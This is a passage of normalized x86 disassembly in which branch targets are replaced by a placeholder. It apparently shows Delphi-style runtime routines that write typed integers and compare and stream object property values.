mov edx esi
mov eax ebx
call sub_420984
mov dl 0xd
mov eax ebx
call sub_420b6c
jmp r-xdata
sub_41f224
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_420b6c
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e914
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_420b6c
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e914
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_420b6c
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41e914
jmp r-xdata
pop edx
pop ebx
retn
sub_41f298
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov dl 0x13
mov eax ebx
call sub_420b6c
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e914
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ebx
call sub_41f224
jmp r-xdata
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_41f300
push ebx
push esi
push ecx
mov esi ecx
mov [ esp ] dl
mov ebx eax
mov al [ r-xdata ]
cmp al [ esp ]
je r-xdata
pop edx
pop esi
pop ebx
retn
mov al [ esp ]
or al 0xf0
mov [ esp + 0x1 ] al
lea edx [ esp + 0x1 ]
mov ecx 0x1
mov eax ebx
call sub_41e914
test [ esp ] 0x2
je r-xdata
mov edx esi
mov eax ebx
call sub_41f224
sub_41f344
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4034d8
call sub_414ba0
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_4026ec
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41f3f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4034d8
mov edx [ ebp - 0x10 ]
call sub_414da4
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x2
mov eax [ ebp - 0x10 ]
call sub_40270c
retn
inc esi
xor edi edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_414df8
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4203d8
mov eax [ ebp - 0x10 ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
sub_41f40c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4031f8
mov edx eax
mov eax [ edi ]
call sub_4034c4
test al al
jne r-xdata
mov al 0x1
sub_41f43c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414e28
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax 0x80000000
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414e28
cmp ebx eax
sete al
pop ebx
pop ebp
retn
xor eax eax
jmp r-xdata
cmp eax ebx
je r-xdata
pop ebx
pop ebp
retn
mov al 0x1
sub_41f494
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415358
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
sete al
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415358
fld [ ebp - 0x10 ]
fcompp
fnstsw ax
sahf
sete al
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_41f4f0
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415774
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415774
cmp edx [ ebp - 0x4 ]
jne r-xdata
sete al
cmp [ ebp - 0x8 ] 0x0
sete al
jmp r-xdata
cmp eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41f548
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f5c7
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41519c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_404930
sete bl
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_41519c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404930
sete bl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5ce
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4047d0
retn
sub_41f5d8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408020
test al al
jne r-xdata
mov al 0x1
sub_41f618
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
sete al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414e28
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_41f5d8
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub_41f670
push ebp
mov ebp esp
push ecx
push ebx
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414e28
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
push ebp
call sub_41f618
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
push ebp
call sub_41f618
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
sub_41f6f0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f79c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
sete bl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f7a3
lea eax [ ebp - 0x8 ]
call sub_405944
lea eax [ ebp - 0x4 ]
call sub_405944
retn
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4157d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0x4 ]
sete bl
test bl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405944
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d574
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_41f5d8
pop ecx
mov ebx eax
sub_41f7bc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41f879
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4157d8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405944
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d574
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f880
lea eax [ ebp - 0x10 ]
call sub_405944
lea eax [ ebp - 0xc ]
call sub_405944
lea eax [ ebp - 0x4 ]
call sub_405944
retn
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4157d8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
call sub_41f6f0
pop ecx
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
sub_41f898
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4156fc
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp ebx [ ebp - 0x8 ]
je r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4156fc
mov ebx [ ebp - 0x10 ]
mov al 0x1
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x110 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov eax [ eax ]
mov edx esi
call sub_40356c
cmp [ ebp - 0x110 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f910
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41f997
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41567c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_414314
mov ebx eax
lea ecx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_41567c
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_414388
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f99e
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404b54
retn
sub_41f9a8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_41f40c
mov [ ebp - 0x9 ] al
mov bl 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
jmp [ eax * 4 + jump_table_41fa6a ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414e28
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
push ebp
call sub_41f43c
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f494
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f548
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f670
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f898
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f910
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f4f0
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f7bc
pop ecx
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414e28
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41fb10
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41fb58
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_404310
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420920
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fb5f
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_41fb64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_41fbea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_414ba0
mov eax [ eax + 0x1 ]
mov edi [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xb
call sub_420b6c
xor ebx ebx
jae r-xdata
bt esi eax
inc ebx
cmp ebx 0x20
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_414bac
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420984
mov eax ebx
cmp eax 0x1f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_420984
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fbf1
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_41fbf8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_41fc58
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_41819c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41f224
lea edx [ ebp - 0x4 ]
mov eax esi
call ebx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41f160
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fc5f
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_41fc64
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41fcfa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
call sub_41fb10
pop ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_404144
xor eax eax
push ebp
push sub_41fcdd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
call sub_4040ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41ea64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fce4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_404100
retn
sub_41fd08
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41fdbc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414e28
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_41fb10
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax ]
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov edx ebx
call sub_41fbf8
pop ecx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fdc3
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ea14
jmp r-xdata
dec al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_414bac
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f160
sub al 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_41fb64
pop ecx
jmp r-xdata
jmp r-xdata
sub_41fdc8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415358
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
push eax
call sub_41fb10
pop ecx
mov ax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f0d0
mov esp ebp
pop ebp
retn
sub_41fe08
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415774
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_41fb10
pop ecx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f298
pop ecx
pop ecx
pop ebp
retn
sub_41fe44
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41fe99
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_41519c
mov eax [ ebp + 0x8 ]
push eax
call sub_41fb10
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_420ab8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fea0
lea eax [ ebp - 0x4 ]
call sub_4047b8
retn
sub_41febc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ffab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404100
jmp r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_404100
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ffb2
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_4040ac
mov eax esi
mov ecx r-xdata
mov edx [ ebx + 0x8 ]
call sub_4043b8
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax edi
call sub_41fea4
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_40442c
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_41febc
pop ecx
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_40442c
jmp r-xdata
sub_41ffe4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_4201d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414e28
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41fb10
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420b6c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4201df
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_4040d0
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_404144
xor eax eax
push ebp
push sub_420159
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push [ eax + 0x2c ]
lea eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_404310
push [ ebp - 0x14 ]
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx 0x3
call sub_40442c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41f344
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0xc ]
call sub_404100
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_414e28
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41febc
pop ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41fb10
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_41f160
jmp r-xdata
sub_4201f0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_4202ad
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4157d8
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405944
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d574
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41fb10
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420b6c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4202b4
lea eax [ ebp - 0xc ]
call sub_4040ac
lea eax [ ebp - 0x8 ]
call sub_405944
lea eax [ ebp - 0x4 ]
call sub_405944
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41febc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_41fb10
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_41f160
sub_4202cc
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420367
push [ fs : eax ]
